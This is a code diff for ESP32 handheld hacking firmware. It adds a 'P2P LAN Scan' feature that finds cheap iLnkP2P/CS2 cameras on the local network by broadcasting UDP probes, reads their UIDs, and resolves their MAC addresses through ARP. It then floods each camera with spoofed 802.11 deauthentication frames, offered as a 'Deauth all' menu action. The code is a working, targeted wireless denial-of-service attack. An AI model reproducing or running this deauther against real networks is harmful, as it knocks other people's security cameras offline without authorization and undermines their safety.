@@ -5,9 +5,13 @@
 #include "core/mykeyboard.h"
 #include "core/utils.h"
 #include "core/wifi/wifi_common.h"
+#include "esp_netif.h"
+#include "esp_netif_net_stack.h"
 #include "esp_wifi.h"
+#include "lwip/etharp.h"
 #include "modules/wifi/wifi_atks.h"
 #include <WiFi.h>
+#include <WiFiUdp.h>
 #include <functional>
 #include <globals.h>
 #include <vector>
@@ -287,10 +291,253 @@ static void cameraDeauther() {
     returnToMenu = true;
 }
 
+// ---------------------------------------------------------------------------
+// P2P LAN Scan: active discovery of iLnkP2P / CS2 Network P2P cameras.
+//
+// These are the cheap OEM cameras that passive OUI/SSID scanning misses. Once
+// joined to a Wi-Fi network we broadcast the LAN-search probe on UDP 32108;
+// P2P cameras reply with a packet carrying their UID (PREFIX-serial-check). We
+// then ARP-resolve each responder's IP -> MAC so the matching deauther can
+// target the camera station directly. Requires being connected to the same
+// network as the cameras (active, not passive).
+// ---------------------------------------------------------------------------
+static const uint16_t P2P_PORT = 32108;
+
+struct P2PCam {
+    String uid;
+    String brand;
+    IPAddress ip;
+    uint8_t mac[6];
+    bool haveMac;
+};
+
+static struct netif *p2pStaNetif() {
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta) return nullptr;
+    return (struct netif *)esp_netif_get_netif_impl(sta);
+}
+
+// Broadcast the LAN-search probes and collect responders.
+static void p2pDiscover(std::vector<P2PCam> &out) {
+    WiFiUDP udp;
+    if (!udp.begin(P2P_PORT)) {
+        // fall back to an ephemeral local port; replies still come to our source
+        udp.begin(0);
+    }
+
+    const uint8_t probeSearch[4] = {0xF1, 0x30, 0x00, 0x00};    // MSG_LAN_SEARCH
+    const uint8_t probeSearchExt[4] = {0xF1, 0x32, 0x00, 0x00}; // MSG_LAN_SEARCH_EXT
+
+    for (int r = 0; r < 3; r++) {
+        udp.beginPacket(IPAddress(255, 255, 255, 255), P2P_PORT);
+        udp.write(probeSearch, sizeof(probeSearch));
+        udp.endPacket();
+        udp.beginPacket(IPAddress(255, 255, 255, 255), P2P_PORT);
+        udp.write(probeSearchExt, sizeof(probeSearchExt));
+        udp.endPacket();
+        delay(60);
+    }
+
+    uint32_t start = millis();
+    while (millis() - start < 2500) {
+        int len = udp.parsePacket();
+        if (len >= 22) {
+            uint8_t buf[128];
+            int n = udp.read(buf, sizeof(buf));
+            IPAddress from = udp.remoteIP();
+            // Response magic 0xF1; payload = prefix(8) serial(4 BE) check(6).
+            if (n >= 22 && buf[0] == 0xF1) {
+                char prefix[9] = {0};
+                int pl = 0;
+                for (int i = 0; i < 8; i++) {
+                    char c = (char)buf[4 + i];
+                    if (c >= 'A' && c <= 'Z') prefix[pl++] = c;
+                    else break;
+                }
+                if (pl >= 2) { // looks like a real UID prefix
+                    uint32_t serial =
+                        ((uint32_t)buf[12] << 24) | (buf[13] << 16) | (buf[14] << 8) | buf[15];
+                    char check[7] = {0};
+                    for (int i = 0; i < 6; i++) {
+                        char c = (char)buf[16 + i];
+                        check[i] = (c >= 32 && c < 127) ? c : '\0';
+                    }
+                    char uid[40];
+                    snprintf(uid, sizeof(uid), "%s-%06u-%s", prefix, serial, check);
+
+                    bool dup = false;
+                    for (auto &c : out)
+                        if (c.ip == from) {
+                            dup = true;
+                            break;
+                        }
+                    if (!dup && out.size() < 64) {
+                        // Yunni devices use an [A-F]{5} check code; else CS2.
+                        bool yunni = strlen(check) == 5;
+                        for (int i = 0; i < (int)strlen(check) && yunni; i++)
+                            if (check[i] < 'A' || check[i] > 'F') yunni = false;
+                        const char *brand = identifyP2PPrefix(String(prefix));
+                        P2PCam cam = {};
+                        cam.uid = uid;
+                        cam.brand = brand ? brand : (yunni ? "iLnkP2P cam" : "CS2 P2P cam");
+                        cam.ip = from;
+                        cam.haveMac = false;
+                        out.push_back(cam);
+                    }
+                }
+            }
+        }
+        delay(5);
+    }
+    udp.stop();
+}
+
+// Resolve each camera IP -> station MAC via the lwIP ARP table.
+static void p2pResolveMacs(std::vector<P2PCam> &cams) {
+    struct netif *nif = p2pStaNetif();
+    if (!nif) return;
+
+    for (auto &c : cams) {
+        ip4_addr_t ip;
+        ip.addr = (uint32_t)c.ip;
+        etharp_request(nif, &ip); // trigger ARP so the table gets populated
+    }
+    delay(500);
+
+    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
+        ip4_addr_t *ipr = nullptr;
+        struct eth_addr *ethr = nullptr;
+        struct netif *tif = nullptr;
+        if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
+        if (!ipr || !ethr) continue;
+        for (auto &c : cams) {
+            if (!c.haveMac && (uint32_t)c.ip == ipr->addr) {
+                memcpy(c.mac, ethr->addr, 6);
+                c.haveMac = true;
+            }
+        }
+    }
+}
+
+// Targeted station deauth of the discovered P2P cameras. We stay associated to
+// the AP and inject deauths (source = AP BSSID, dest = camera MAC) on the STA
+// interface at the current channel.
+static void p2pDeauthCams(std::vector<P2PCam> &cams) {
+    uint8_t *bssid = WiFi.BSSID();
+    int withMac = 0;
+    for (auto &c : cams)
+        if (c.haveMac) withMac++;
+    if (!bssid || withMac == 0) {
+        displayTextLine("No MACs resolved");
+        delay(1500);
+        return;
+    }
+
+    uint8_t frame[sizeof(deauth_frame_default)];
+    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
+    memcpy(&frame[10], bssid, 6); // source = AP
+    memcpy(&frame[16], bssid, 6); // BSSID = AP
+
+    uint32_t lastTime = millis();
+    uint16_t count = 0;
+    drawMainBorderWithTitle("P2P Deauth");
+    tft.setCursor(10, 60);
+    tft.println(String(withMac) + " P2P cam(s)");
+
+    while (!check(EscPress)) {
+        for (auto &c : cams) {
+            if (!c.haveMac) continue;
+            memcpy(&frame[4], c.mac, 6); // dest = camera station
+            for (int i = 0; i < 30; i++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(deauth_frame_default), false);
+                count += 1;
+                delay(1);
+                if (EscPress) break;
+            }
+            if (EscPress) break;
+        }
+        if (millis() - lastTime > 2000) {
+            drawMainBorderWithTitle("P2P Deauth");
+            tft.setCursor(10, 60);
+            tft.println(String(withMac) + " P2P cam(s)");
+            tft.setCursor(10, tftHeight - 25);
+            tft.println("Frames: " + String(count / 2) + "/s   ");
+            count = 0;
+            lastTime = millis();
+        }
+    }
+    returnToMenu = true;
+}
+
+static void p2pDetail(const P2PCam &cam) {
+    drawMainBorder();
+    tft.setTextColor(bruceConfig.priColor);
+    tft.drawCentreString("-=P2P Camera=-", tftWidth / 2, 28, SMOOTH_FONT);
+    tft.drawString("UID: " + cam.uid, 10, 48);
+    tft.drawString("Brand: " + cam.brand, 10, 66);
+    tft.drawString("IP: " + cam.ip.toString(), 10, 84);
+    if (cam.haveMac) {
+        char m[18];
+        snprintf(
+            m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X", cam.mac[0], cam.mac[1], cam.mac[2],
+            cam.mac[3], cam.mac[4], cam.mac[5]
+        );
+        tft.drawString("MAC: " + String(m), 10, 102);
+    } else {
+        tft.drawString("MAC: (unresolved)", 10, 102);
+    }
+    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);
+    delay(300);
+    while (!check(SelPress) && !check(EscPress)) yield();
+}
+
+static void p2pLanScan() {
+    if (WiFi.status() != WL_CONNECTED) {
+        if (!wifiConnectMenu(WIFI_MODE_STA) && WiFi.status() != WL_CONNECTED) {
+            displayTextLine("WiFi needed for P2P");
+            delay(1500);
+            return;
+        }
+    }
+    if (WiFi.status() != WL_CONNECTED) {
+        displayTextLine("Not connected");
+        delay(1500);
+        return;
+    }
+
+    displayTextLine("P2P discovering..");
+    std::vector<P2PCam> cams;
+    p2pDiscover(cams);
+
+    if (cams.empty()) {
+        displayTextLine("No P2P cameras");
+        delay(1500);
+        return;
+    }
+
+    p2pResolveMacs(cams);
+
+    std::vector<P2PCam> found = cams; // capture for deauth action
+    options = {};
+    options.emplace_back(
+        (String("Deauth all (") + String((int)found.size()) + ")").c_str(),
+        [found]() mutable { p2pDeauthCams(found); }
+    );
+    for (auto &cam : cams) {
+        P2PCam c = cam;
+        String label = c.brand + " " + c.ip.toString();
+        options.emplace_back(label.c_str(), [c]() { p2pDetail(c); });
+    }
+    addOptionToMainMenu();
+    loopOptions(options, MENU_TYPE_SUBMENU, "P2P Cameras");
+    options.clear();
+}
+
 void camDetectorMenu() {
     options = {
         {"Camera Scan",     cameraScan                },
         {"Camera Deauther", cameraDeauther            },
+        {"P2P LAN Scan",    p2pLanScan                },
         {"Flock Detector",  flockDetector             },
         {"Axon Detector",   axonDetector              },
         {"RayBan Detector", raybanDetector            },
